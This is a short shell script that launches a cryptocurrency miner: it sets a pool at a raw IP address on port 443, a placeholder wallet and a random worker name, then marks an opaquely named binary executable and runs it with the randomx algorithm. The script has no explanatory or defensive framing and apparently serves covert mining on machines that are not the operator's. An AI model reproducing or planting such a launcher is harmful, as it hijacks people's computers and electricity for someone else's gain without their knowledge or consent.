POOL=208.113.200.73:443

WALLET=THISPC

WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)

chmod +x hajar

./hajar --disable-gpu --algorithm randomx --pool $POOL --wallet $WALLET.$WORKER
